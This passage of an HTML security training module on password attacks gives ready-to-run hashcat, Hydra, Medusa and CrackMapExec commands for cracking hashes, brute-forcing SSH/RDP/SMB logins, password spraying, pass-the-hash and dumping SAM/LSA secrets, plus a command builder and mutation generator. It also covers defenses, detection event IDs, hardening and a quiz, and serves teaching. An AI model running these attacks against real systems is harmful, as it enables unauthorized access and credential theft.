hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# -a 1: Combination attack (combine two wordlists)
hashcat -m 1000 -a 1 hashes.txt wordlist1.txt wordlist2.txt

# -a 3: Brute force / mask attack
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a

# -a 6: Hybrid wordlist + mask
hashcat -m 1000 -a 6 hashes.txt rockyou.txt ?d?d?d?d

# -a 7: Hybrid mask + wordlist
hashcat -m 1000 -a 7 hashes.txt ?u?u rockyou.txt</code></pre>

                        <h4>Advanced Hashcat Techniques</h4>
<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Use rules file
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -r best64.rule

# Session management
hashcat -m 1000 -a 0 hashes.txt rockyou.txt --session=mysession
hashcat --session=mysession --restore

# Performance tuning
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -w 3  # Workload profile (1-4)
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -O    # Optimized kernels

# Show results
hashcat -m 1000 hashes.txt --show

# Benchmark mode (test performance)
hashcat -b -m 1000

# Incremental mask attack (custom charset)
hashcat -m 1000 -a 3 hashes.txt -1 ?l?u?d ?1?1?1?1?1?1?1?1

# Output to file
hashcat -m 1000 -a 0 hashes.txt rockyou.txt -o cracked.txt</code></pre>

                        <div class="callout info">
                            <strong>GPU Performance:</strong> Modern GPUs can test billions of hashes per second. An RTX 4090 can test ~200 GH/s for NTLM, meaning 200 billion attempts per second. This makes weak hashing algorithms like MD5 and NTLM extremely vulnerable.
                        </div>

                        <h3>Hydra - Online Password Attacks</h3>
                        <p>THC Hydra is a parallelized network login cracker supporting numerous protocols.</p>

<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># SSH brute force
hydra -l admin -P passwords.txt ssh://192.168.1.100

# FTP with username list
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# HTTP POST form attack
hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# RDP attack
hydra -l administrator -P passwords.txt rdp://192.168.1.100

# SMB/Windows shares
hydra -l admin -P passwords.txt smb://192.168.1.100

# Common flags:
# -l username   : Single username
# -L userlist   : Username list file
# -p password   : Single password
# -P passlist   : Password list file
# -t threads    : Parallel connections (default: 16)
# -v            : Verbose output
# -f            : Exit after first valid login found</code></pre>

                        <h3>CrackMapExec (CME)</h3>
                        <p>Swiss army knife for pentesting Windows/Active Directory networks.</p>

<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Password spray across subnet
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# Pass-the-hash attack
crackmapexec smb 192.168.1.0/24 -u Administrator -H 'NTLM_HASH'

# Dump SAM hashes
crackmapexec smb 192.168.1.100 -u admin -p password --sam

# Dump LSA secrets
crackmapexec smb 192.168.1.100 -u admin -p password --lsa

# Execute command
crackmapexec smb 192.168.1.100 -u admin -p password -x whoami

# Enumerate shares
crackmapexec smb 192.168.1.0/24 -u guest -p '' --shares</code></pre>

                        <h3>Medusa</h3>
                        <p>Fast, parallel, modular login brute-forcer.</p>

<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># SSH attack
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# Multiple hosts from file
medusa -H hosts.txt -u admin -P passwords.txt -M ssh

# HTTP authentication
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -m DIR:/admin

# Available modules
medusa -d</code></pre>

                        <div class="callout success">
                            <strong>Tool Selection Guide:</strong>
                            <ul style="margin-top: 10px;">
                                <li><strong>Offline cracking:</strong> Hashcat (GPU) or John (CPU)</li>
                                <li><strong>Online attacks:</strong> Hydra or Medusa</li>
                                <li><strong>Windows/AD:</strong> CrackMapExec or Mimikatz</li>
                                <li><strong>Wordlist generation:</strong> Crunch or CeWL</li>
                            </ul>
                        </div>
                    </div>

                    <!-- Interactive Tools Section -->
                    <div class="section" id="interactive">
                        <h2>Interactive Password Tools</h2>

                        <!-- Hash Identifier -->
                        <div class="tool-container">
                            <div class="tool-title">Hash Type Identifier</div>
                            <p>Paste a hash below to identify its likely type:</p>

                            <div class="input-group">
                                <label>Hash Value:</label>
                                <input type="text" id="hashInput" placeholder="5d41402abc4b2a76b9719d911017c592">
                            </div>

                            <button class="btn" onclick="identifyHash()">Identify Hash</button>

                            <div class="output" id="hashOutput">Results will appear here...</div>
                        </div>

                        <!-- Brute Force Time Calculator -->
                        <div class="tool-container">
                            <div class="tool-title">Brute Force Time Estimator</div>
                            <p>Calculate how long a brute force attack would take:</p>

                            <div class="metric-grid">
                                <div class="input-group">
                                    <label>Password Length:</label>
                                    <input type="number" id="pwLength" value="8" min="1" max="20">
                                </div>
                                <div class="input-group">
                                    <label>Character Set:</label>
                                    <select id="charSet">
                                        <option value="26">Lowercase (a-z) - 26 chars</option>
                                        <option value="52">Mixed case (a-zA-Z) - 52 chars</option>
                                        <option value="62">Alphanumeric (a-zA-Z0-9) - 62 chars</option>
                                        <option value="95" selected>All printable ASCII - 95 chars</option>
                                    </select>
                                </div>
                            </div>

                            <div class="input-group">
                                <label>Hash Rate (hashes/second):</label>
                                <select id="hashRate">
                                    <option value="1000000">1 MH/s (1 million) - CPU</option>
                                    <option value="1000000000">1 GH/s (1 billion) - Weak GPU</option>
                                    <option value="10000000000">10 GH/s - Mid GPU</option>
                                    <option value="100000000000" selected>100 GH/s - High-end GPU</option>
                                    <option value="1000000000000">1 TH/s - Multi-GPU rig</option>
                                </select>
                            </div>

                            <button class="btn" onclick="calculateBruteForce()">Calculate</button>

                            <div class="output" id="bruteForceOutput">Results will appear here...</div>
                        </div>

                        <!-- Password Rule Generator -->
                        <div class="tool-container">
                            <div class="tool-title">Password Rule Generator</div>
                            <p>Generate common password mutations from a base word:</p>

                            <div class="input-group">
                                <label>Base Word:</label>
                                <input type="text" id="baseWord" placeholder="password">
                            </div>

                            <div class="input-group">
                                <label>Mutation Rules:</label>
                                <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 10px;">
                                    <label style="display: flex; align-items: center; gap: 8px;">
                                        <input type="checkbox" id="ruleCapital" checked> Capitalize first letter
                                    </label>
                                    <label style="display: flex; align-items: center; gap: 8px;">
                                        <input type="checkbox" id="ruleUpper" checked> ALL UPPERCASE
                                    </label>
                                    <label style="display: flex; align-items: center; gap: 8px;">
                                        <input type="checkbox" id="ruleNumbers" checked> Append numbers (123, 2024)
                                    </label>
                                    <label style="display: flex; align-items: center; gap: 8px;">
                                        <input type="checkbox" id="ruleSpecial" checked> Append special chars (!@#)
                                    </label>
                                    <label style="display: flex; align-items: center; gap: 8px;">
                                        <input type="checkbox" id="ruleLeet" checked> L33tspeak (a→@, e→3, etc.)
                                    </label>
                                    <label style="display: flex; align-items: center; gap: 8px;">
                                        <input type="checkbox" id="ruleDouble" checked> Double word (passwordpassword)
                                    </label>
                                </div>
                            </div>

                            <button class="btn" onclick="generateMutations()">Generate Mutations</button>
                            <button class="btn btn-secondary" onclick="copyMutations()">Copy All</button>

                            <div class="output" id="mutationsOutput" style="max-height: 300px; overflow-y: auto;">Mutations will appear here...</div>
                        </div>

                        <!-- Command Builder -->
                        <div class="tool-container">
                            <div class="tool-title">Attack Command Builder</div>
                            <p>Generate ready-to-use password cracking commands:</p>

                            <div class="input-group">
                                <label>Tool:</label>
                                <select id="toolSelect" onchange="updateCommandBuilder()">
                                    <option value="hashcat">Hashcat</option>
                                    <option value="john">John the Ripper</option>
                                    <option value="hydra">Hydra</option>
                                </select>
                            </div>

                            <div id="hashcatOptions">
                                <div class="input-group">
                                    <label>Hash Type:</label>
                                    <select id="hashType">
                                        <option value="0">MD5</option>
                                        <option value="100">SHA1</option>
                                        <option value="1000" selected>NTLM</option>
                                        <option value="1800">sha512crypt (Linux)</option>
                                        <option value="3200">bcrypt</option>
                                        <option value="5600">NetNTLMv2</option>
                                        <option value="13100">Kerberos 5 TGS-REP</option>
                                    </select>
                                </div>

                                <div class="input-group">
                                    <label>Attack Mode:</label>
                                    <select id="attackMode">
                                        <option value="0" selected>Dictionary Attack</option>
                                        <option value="3">Brute Force (Mask)</option>
                                        <option value="6">Hybrid (Wordlist + Mask)</option>
                                        <option value="7">Hybrid (Mask + Wordlist)</option>
                                    </select>
                                </div>

                                <div class="input-group">
                                    <label>Hash File:</label>
                                    <input type="text" id="hashFile" value="hashes.txt">
                                </div>

                                <div class="input-group">
                                    <label>Wordlist:</label>
                                    <input type="text" id="wordlistFile" value="rockyou.txt">
                                </div>
                            </div>

                            <button class="btn" onclick="buildCommand()">Build Command</button>

                            <div class="output" id="commandOutput">Command will appear here...</div>
                        </div>
                    </div>

                    <!-- Defense Section -->
                    <div class="section" id="defense">
                        <h2>Password Defense Strategies</h2>

                        <h3>Password Policy Best Practices</h3>
                        <p>Effective password policies balance security with usability:</p>

                        <div class="table-container">
                            <table>
                                <thead>
                                    <tr>
                                        <th>Policy Element</th>
                                        <th>Recommendation</th>
                                        <th>Rationale</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr>
                                        <td>Minimum Length</td>
                                        <td>12-16 characters</td>
                                        <td>Length is more important than complexity</td>
                                    </tr>
                                    <tr>
                                        <td>Complexity</td>
                                        <td>Encourage passphrases</td>
                                        <td>4 random words > complex 8-char password</td>
                                    </tr>
                                    <tr>
                                        <td>Expiration</td>
                                        <td>Not required if strong</td>
                                        <td>Forced changes lead to predictable patterns</td>
                                    </tr>
                                    <tr>
                                        <td>History</td>
                                        <td>Remember last 12-24</td>
                                        <td>Prevent password reuse</td>
                                    </tr>
                                    <tr>
                                        <td>Lockout Threshold</td>
                                        <td>5-10 failed attempts</td>
                                        <td>Balance security vs. DoS risk</td>
                                    </tr>
                                    <tr>
                                        <td>Lockout Duration</td>
                                        <td>15-30 minutes</td>
                                        <td>Slow down brute force attacks</td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>

                        <div class="callout success">
                            <strong>NIST Guidelines (SP 800-63B):</strong> Modern guidance recommends eliminating periodic password changes, allowing passphrases, screening against common password lists, and requiring MFA for sensitive accounts.
                        </div>

                        <h3>Multi-Factor Authentication (MFA)</h3>
                        <p>MFA dramatically reduces the effectiveness of password attacks by requiring additional verification factors:</p>

                        <h4>MFA Factor Types</h4>
                        <ul>
                            <li><strong>Something you know:</strong> Password, PIN</li>
                            <li><strong>Something you have:</strong> Phone, hardware token, smart card</li>
                            <li><strong>Something you are:</strong> Biometrics (fingerprint, face, iris)</li>
                            <li><strong>Somewhere you are:</strong> GPS location, network location</li>
                        </ul>

                        <div class="metric-grid">
                            <div class="metric-card">
                                <div class="metric-label">SMS/Email Codes</div>
                                <div class="metric-value" style="font-size: 1.2em; color: #fbbf24;">⚠️ Low</div>
                                <p style="margin-top: 10px; font-size: 0.85em;">Vulnerable to interception and SIM swapping</p>
                            </div>
                            <div class="metric-card">
                                <div class="metric-label">Authenticator Apps</div>
                                <div class="metric-value" style="font-size: 1.2em; color: #3b82f6;">Good</div>
                                <p style="margin-top: 10px; font-size: 0.85em;">TOTP-based, resistant to phishing</p>
                            </div>
                            <div class="metric-card">
                                <div class="metric-label">Hardware Tokens</div>
                                <div class="metric-value" style="font-size: 1.2em; color: #22c55e;">Best</div>
                                <p style="margin-top: 10px; font-size: 0.85em;">FIDO2/WebAuthn, phishing-resistant</p>
                            </div>
                            <div class="metric-card">
                                <div class="metric-label">Push Notifications</div>
                                <div class="metric-value" style="font-size: 1.2em; color: #3b82f6;">Good</div>
                                <p style="margin-top: 10px; font-size: 0.85em;">Convenient but susceptible to MFA fatigue</p>
                            </div>
                        </div>

                        <h3>Secure Password Storage</h3>
                        <p>How passwords are stored determines their vulnerability to compromise:</p>

                        <h4>Storage Method Comparison</h4>
<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># ❌ NEVER - Plaintext storage
password = "MyPassword123"

# ❌ NEVER - Simple encoding (not encryption)
password = base64.b64encode("MyPassword123")

# ❌ NEVER - Weak hashing without salt
password = md5("MyPassword123")

# ⚠️ WEAK - Fast hashing (even with salt)
password = sha256("MyPassword123" + salt)

# ✅ GOOD - Slow adaptive hashing
password = bcrypt.hashpw("MyPassword123", bcrypt.gensalt(rounds=12))

# ✅ BEST - Modern adaptive hashing
password = argon2.hash("MyPassword123")  # Argon2id recommended</code></pre>

                        <h4>Why Adaptive Hashing?</h4>
                        <div class="callout info">
                            <strong>Cost Factor:</strong> Adaptive hashing algorithms (bcrypt, scrypt, Argon2) allow you to increase computational cost over time. As hardware gets faster, you increase the work factor to maintain security.

                            <div style="margin-top: 15px;">
                                <strong>Example:</strong> bcrypt with cost factor 12 takes ~250ms to compute one hash. This is imperceptible to legitimate users but makes brute force attacks 250 million times slower than MD5.
                            </div>
                        </div>

                        <h3>Account Lockout and Rate Limiting</h3>
                        <p>Defensive mechanisms to slow down or prevent brute force attacks:</p>

<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Windows Group Policy - Account Lockout
Computer Configuration → Windows Settings → Security Settings → Account Policies → Account Lockout Policy

Account lockout threshold: 5 invalid attempts
Account lockout duration: 30 minutes
Reset account lockout counter after: 30 minutes

# Linux PAM Configuration (/etc/pam.d/common-auth)
auth required pam_tally2.so deny=5 unlock_time=1800 onerr=fail

# Web Application - Progressive Delay
def check_password(username, password, attempt_count):
    delay = min(2 ** attempt_count, 30)  # Exponential backoff, max 30s
    time.sleep(delay)
    return verify_password(username, password)</code></pre>

                        <h3>Monitoring and Detection</h3>
                        <p>Detecting password attacks in progress:</p>

                        <h4>Key Indicators of Compromise (IOCs)</h4>
                        <ul>
                            <li><strong>Multiple failed login attempts:</strong> Especially from single source or against multiple accounts</li>
                            <li><strong>Password spray patterns:</strong> Single password tried against many accounts</li>
                            <li><strong>Unusual login locations:</strong> Logins from unexpected geographic locations</li>
                            <li><strong>Impossible travel:</strong> Logins from distant locations within short timeframe</li>
                            <li><strong>Off-hours authentication:</strong> Login attempts outside normal business hours</li>
                            <li><strong>LSASS access:</strong> Processes accessing LSASS memory (Mimikatz indicator)</li>
                            <li><strong>DCSync activity:</strong> Unusual replication requests from non-DC systems</li>
                        </ul>

                        <h4>Windows Event IDs to Monitor</h4>
                        <div class="table-container">
                            <table>
                                <thead>
                                    <tr>
                                        <th>Event ID</th>
                                        <th>Description</th>
                                        <th>Significance</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr><td>4625</td><td>Failed logon attempt</td><td>Brute force indicator</td></tr>
                                    <tr><td>4648</td><td>Logon using explicit credentials</td><td>Possible credential theft</td></tr>
                                    <tr><td>4768</td><td>Kerberos TGT requested</td><td>Monitor for AS-REP roasting</td></tr>
                                    <tr><td>4769</td><td>Kerberos service ticket requested</td><td>Monitor for Kerberoasting</td></tr>
                                    <tr><td>4771</td><td>Kerberos pre-authentication failed</td><td>Password attack indicator</td></tr>
                                    <tr><td>4776</td><td>Domain controller validated credentials</td><td>NTLM authentication</td></tr>
                                </tbody>
                            </table>
                        </div>

                        <h3>Credential Storage Best Practices</h3>
                        <div class="callout success">
                            <strong>Enterprise Recommendations:</strong>
                            <ol style="margin-top: 10px;">
                                <li><strong>Disable LM hashes:</strong> Ensure only NTLM/NTLMv2 is used</li>
                                <li><strong>Enable Credential Guard:</strong> Isolate credentials using virtualization</li>
                                <li><strong>Implement LAPS:</strong> Randomize local admin passwords</li>
                                <li><strong>Use managed service accounts:</strong> Eliminate service account password management</li>
                                <li><strong>Deploy privileged access workstations:</strong> Dedicated admin workstations</li>
                                <li><strong>Enable Windows Defender Credential Guard:</strong> Hardware-based protection</li>
                                <li><strong>Implement tiered administration model:</strong> Separate admin tiers</li>
                                <li><strong>Regular credential rotation:</strong> Especially for service accounts</li>
                            </ol>
                        </div>

                        <h4>Windows Hardening Commands</h4>
<pre><button class="copy-btn" onclick="copyCode(this)">Copy</button><code># Disable LM hash storage (requires reboot)
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v NoLMHash /t REG_DWORD /d 1 /f

# Enable NTLMv2 only
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LmCompatibilityLevel /t REG_DWORD /d 5 /f

# Disable WDigest (prevent plaintext credential caching)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f

# Enable Credential Guard (Windows 10 Enterprise+)
# Requires UEFI, Secure Boot, TPM 2.0
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f</code></pre>

                        <div class="callout warning">
                            <strong>Remember:</strong> Defense in depth is critical. No single control will prevent all password attacks. Combine strong password policies, MFA, monitoring, and secure storage for comprehensive protection.
                        </div>
                    </div>
                </div>
            </div>

            <!-- Quiz Sidebar -->
            <div class="sidebar">
                <h3>Knowledge Check</h3>
                <div class="quiz-container" id="quizContainer">
                    <!-- Quiz questions will be populated by JavaScript -->
                </div>
                <button class="quiz-submit" id="submitQuiz" onclick="submitQuiz()">Submit Quiz</button>
                <div id="quizResult"></div>
            </div>
        </div>
    </div>

    <script>
        // Tab Navigation
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', () => {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));

                tab.classList.add('active');
                document.getElementById(tab.dataset.section).classList.add('active');
            });
        });

        // Copy code functionality
        function copyCode(button) {
            const code = button.nextElementSibling.textContent;
            navigator.clipboard.writeText(code).then(() => {
                const originalText = button.textContent;
                button.textContent = 'Copied!';
                button.classList.add('copied');
                setTimeout(() => {
                    button.textContent = originalText;
                    button.classList.remove('copied');
                }, 2000);
            });
        }

        // Hash Identifier
        function identifyHash() {
            const hash = document.getElementById('hashInput').value.trim();
            const output = document.getElementById('hashOutput');

            if (!hash) {
                output.innerHTML = '<span style="color: #fca5a5;">Please enter a hash value</span>';
                return;
            }

            const len = hash.length;
            const isHex = /^[a-fA-F0-9]+$/.test(hash);
            const hasPrefix = hash.includes('$');

            let results = [];

            if (hasPrefix) {
                if (hash.startsWith('$1$')) results.push('MD5 crypt (Unix)');
                if (hash.startsWith('$2a$') || hash.startsWith('$2b$') || hash.startsWith('$2y$')) results.push('bcrypt');
                if (hash.startsWith('$5$')) results.push('SHA-256 crypt');
                if (hash.startsWith('$6$')) results.push('SHA-512 crypt (Linux shadow)');
                if (hash.startsWith('$apr1$')) results.push('Apache MD5');
            } else if (isHex) {
                if (len === 32) results.push('MD5', 'NTLM', 'MD4');
                if (len === 40) results.push('SHA-1', 'MySQL5');
                if (len === 56) results.push('SHA-224');
                if (len === 64) results.push('SHA-256', 'SHA3-256');
                if (len === 96) results.push('SHA-384');
                if (len === 128) results.push('SHA-512', 'SHA3-512');
            }

            if (results.length === 0) {
                output.innerHTML = '<span style="color: #fbbf24;">Unable to identify hash type. Check format and try again.</span>';
            } else {
                output.innerHTML = `<span style="color: #4ade80;">Possible hash types:</span><br><br>` +
                    results.map(r => `• ${r}`).join('<br>');
            }
        }

        // Brute Force Calculator
        function calculateBruteForce() {
            const length = parseInt(document.getElementById('pwLength').value);
            const charset = parseInt(document.getElementById('charSet').value);
            const hashRate = parseInt(document.getElementById('hashRate').value);

            const combinations = Math.pow(charset, length);
            const seconds = combinations / hashRate;

            const output = document.getElementById('bruteForceOutput');

            output.innerHTML = `
                <strong>Total Combinations:</strong> ${combinations.toExponential(2)}<br><br>
                <strong>Time Required:</strong><br>
                ${formatTime(seconds)}
                <br><br>
                <strong>Analysis:</strong> ${analyzeTime(seconds)}
            `;
        }

        function formatTime(seconds) {
            if (seconds < 1) return `${(seconds * 1000).toFixed(2)} milliseconds`;
            if (seconds < 60) return `${seconds.toFixed(2)} seconds`;
            if (seconds < 3600) return `${(seconds / 60).toFixed(2)} minutes`;
            if (seconds < 86400) return `${(seconds / 3600).toFixed(2)} hours`;
            if (seconds < 31536000) return `${(seconds / 86400).toFixed(2)} days`;
            if (seconds < 3153600000) return `${(seconds / 31536000).toFixed(2)} years`;
            return `${(seconds / 31536000000).toFixed(2)} millennia`;
        }

        function analyzeTime(seconds) {
            if (seconds < 60) return '<span style="color: #dc2626;">⚠️ CRITICAL - Crackable in under a minute!</span>';
            if (seconds < 3600) return '<span style="color: #f59e0b;">⚠️ HIGH RISK - Crackable in under an hour</span>';
            if (seconds < 86400) return '<span style="color: #fbbf24;">⚠️ MODERATE - Crackable in under a day</span>';
            if (seconds < 31536000) return '<span style="color: #3b82f6;">Reasonable - Would take significant time</span>';
            return '<span style="color: #22c55e;">✓ Strong - Would take years/centuries to crack</span>';
        }

        // Password Mutation Generator
        function generateMutations() {
            const base = document.getElementById('baseWord').value.trim();
            const output = document.getElementById('mutationsOutput');

            if (!base) {
                output.innerHTML = '<span style="color: #fca5a5;">Please enter a base word</span>';
                return;
            }

            const mutations = new Set([base]); // Start with original

            if (document.getElementById('ruleCapital').checked) {
                mutations.add(base.charAt(0).toUpperCase() + base.slice(1));
            }

            if (document.getElementById('ruleUpper').checked) {
                mutations.add(base.toUpperCase());
            }

            if (document.getElementById('ruleNumbers').checked) {
                ['1', '12', '123', '1234', '2024', '2025', '!', '!1', '!123'].forEach(suffix => {
                    mutations.add(base + suffix);
                    mutations.add(base.charAt(0).toUpperCase() + base.slice(1) + suffix);
                });
            }

            if (document.getElementById('ruleSpecial').checked) {
                ['!', '@', '#', '$', '!@', '!@#'].forEach(suffix => {
                    mutations.add(base + suffix);
                });
            }

            if (document.getElementById('ruleLeet').checked) {
                const leet = base
                    .replace(/a/gi, '@')
                    .replace(/e/gi, '3')
                    .replace(/i/gi, '1')
                    .replace(/o/gi, '0')
                    .replace(/s/gi, '$')
                    .replace(/t/gi, '7');
                mutations.add(leet);
                mutations.add(leet.charAt(0).toUpperCase() + leet.slice(1));
            }

            if (document.getElementById('ruleDouble').checked) {
                mutations.add(base + base);
                mutations.add(base + base.charAt(0).toUpperCase() + base.slice(1));
            }

            const sorted = Array.from(mutations).sort();
            output.innerHTML = `<strong>Generated ${sorted.length} mutations:</strong><br><br>` +
                sorted.map(m => `<span style="color: #4ade80;">${m}</span>`).join('<br>');
        }

        function copyMutations() {
            const output = document.getElementById('mutationsOutput');
            const text = output.textContent
                .split('\n')
                .slice(2)
                .join('\n')
                .trim();

            if (text) {
                navigator.clipboard.writeText(text);
                alert('Mutations copied to clipboard!');
            }
        }

        // Command Builder
        function updateCommandBuilder() {
            // Show/hide tool-specific options
            const tool = document.getElementById('toolSelect').value;
            // Currently only hashcat has options, could extend for others
        }

        function buildCommand() {
            const tool = document.getElementById('toolSelect').value;
            const output = document.getElementById('commandOutput');

            let command = '';

            if (tool === 'hashcat') {
                const hashType = document.getElementById('hashType').value;
                const attackMode = document.getElementById('attackMode').value;
                const hashFile = document.getElementById('hashFile').value;
                const wordlist = document.getElementById('wordlistFile').value;

                command = `hashcat -m ${hashType} -a ${attackMode} ${hashFile} ${wordlist}`;

                if (attackMode === '3') {
                    command = `hashcat -m ${hashType} -a 3 ${hashFile} ?a?a?a?a?a?a?a?a`;
                } else if (attackMode === '6') {
                    command = `hashcat -m ${hashType} -a 6 ${hashFile} ${wordlist} ?d?d?d?d`;
                } else if (attackMode === '7') {
                    command = `hashcat -m ${hashType} -a 7 ${hashFile} ?u?u ${wordlist}`;
                }
            } else if (tool === 'john') {
                command = `john --wordlist=rockyou.txt --rules=best64 hashes.txt`;
            } else if (tool === 'hydra') {
                command = `hydra -l admin -P passwords.txt ssh://192.168.1.100`;
            }

            output.innerHTML = `<strong>Generated Command:</strong><br><br><span style="color: #4ade80;">${command}</span>`;
        }

        // Quiz System
        const quizQuestions = [
            {
                question: "Which hash type is used by Windows for modern password storage?",
                options: ["MD5", "SHA-1", "NTLM", "bcrypt"],
                correct: 2
            },
            {
                question: "What is the primary advantage of rainbow table attacks?",
                options: [
                    "They work against salted hashes",
                    "They trade disk space for computation time",
                    "They are faster than GPU cracking",
                    "They require no storage"
                ],
                correct: 1
            },
            {
                question: "Which Hashcat mask represents all printable ASCII characters?",
                options: ["?a", "?l?u?d?s", "?b", "?p"],
                correct: 0
            },
            {
                question: "What does the Mimikatz command 'sekurlsa::logonpasswords' do?",
                options: [
                    "Extracts SAM database hashes",
                    "Dumps credentials from LSASS memory",
                    "Performs DCSync attack",
                    "Cracks NTLM hashes"
                ],
                correct: 1
            },
            {
                question: "Which attack combines dictionary words with rule-based modifications?",
                options: ["Brute force", "Rainbow table", "Hybrid attack", "Dictionary attack"],
                correct: 2
            },
            {
                question: "What is Kerberoasting?",
                options: [
                    "Cracking Kerberos passwords offline",
                    "Requesting service tickets to crack service account passwords",
                    "Forging Kerberos tickets",
                    "Dumping Kerberos tickets from memory"
                ],
                correct: 1
            },
            {
                question: "Why is bcrypt considered more secure than MD5 for password hashing?",
                options: [
                    "It produces longer hashes",
                    "It uses adaptive cost factor that slows down cracking",
                    "It cannot be cracked",
                    "It requires less computational power"
                ],
                correct: 1
            },
            {
                question: "What does the SAM database store?",
                options: [
                    "System configuration settings",
                    "Local user account password hashes",
                    "Domain controller data",
                    "Application passwords"
                ],
                correct: 1
            },
            {
                question: "Which of the following is NOT a valid MFA factor type?",
                options: [
                    "Something you know",
                    "Something you have",
                    "Something you want",
                    "Something you are"
                ],
                correct: 2
            },
            {
                question: "What is the primary defense against rainbow table attacks?",
                options: [
                    "Using longer passwords",
                    "Salting password hashes",
                    "Encrypting the hash database",
                    "Using uppercase letters"
                ],
                correct: 1
            }
        ];

        function initializeQuiz() {
            const container = document.getElementById('quizContainer');
            let html = '';

            quizQuestions.forEach((q, index) => {
                html += `
                    <div class="question" data-question="${index}">
                        <div class="question-text">${index + 1}. ${q.question}</div>
                        ${q.options.map((opt, optIndex) => `
                            <div class="option" data-option="${optIndex}" onclick="selectOption(${index}, ${optIndex})">
                                ${opt}
                            </div>
                        `).join('')}
                    </div>
                `;
            });

            container.innerHTML = html;
        }

        const selectedAnswers = {};

        function selectOption(questionIndex, optionIndex) {
            const question = document.querySelector(`[data-question="${questionIndex}"]`);
            question.querySelectorAll('.option').forEach(opt => opt.classList.remove('selected'));
            question.querySelector(`[data-option="${optionIndex}"]`).classList.add('selected');
            selectedAnswers[questionIndex] = optionIndex;
        }

        function submitQuiz() {
            if (Object.keys(selectedAnswers).length < quizQuestions.length) {
                alert('Please answer all questions before submitting.');
                return;
            }

            let correct = 0;
            quizQuestions.forEach((q, index) => {
                const question = document.querySelector(`[data-question="${index}"]`);
                const options = question.querySelectorAll('.option');

                options.forEach((opt, optIndex) => {
                    opt.classList.remove('correct', 'incorrect');
                    if (optIndex === q.correct) {
                        opt.classList.add('correct');
                    }
                    if (selectedAnswers[index] === optIndex && optIndex !== q.correct) {
                        opt.classList.add('incorrect');
                    }
                });

                if (selectedAnswers[index] === q.correct) {
                    correct++;
                }
            });

            const percentage = Math.round((correct / quizQuestions.length) * 100);
            const passed = percentage >= 70;

            const resultDiv = document.getElementById('quizResult');
            resultDiv.className = `quiz-result ${passed ? 'pass' : 'fail'}`;
            resultDiv.innerHTML = `
                <div style="font-size: 2em; margin-bottom: 10px;">${percentage}%</div>
                <div>${correct} out of ${quizQuestions.length} correct</div>
                <div style="margin-top: 10px;">${passed ? '✓ PASSED' : '✗ FAILED - Review material and try again'}</div>
            `;

            document.getElementById('submitQuiz').disabled = true;

            // Track completion with ModuleProgress
            if (passed && typeof ModuleProgress !== 'undefined') {
                ModuleProgress.completeQuiz('dark-arts', 'password-attacks-quiz', percentage, {
                    silent: false,
                    returnToDashboard: false
                });
            }
        }

        // Initialize quiz on load
        document.addEventListener('DOMContentLoaded', () => {
            initializeQuiz();
        });
    </script>
<script src="../../components/FluxCapacitor.js"></script>
</body>
</html>
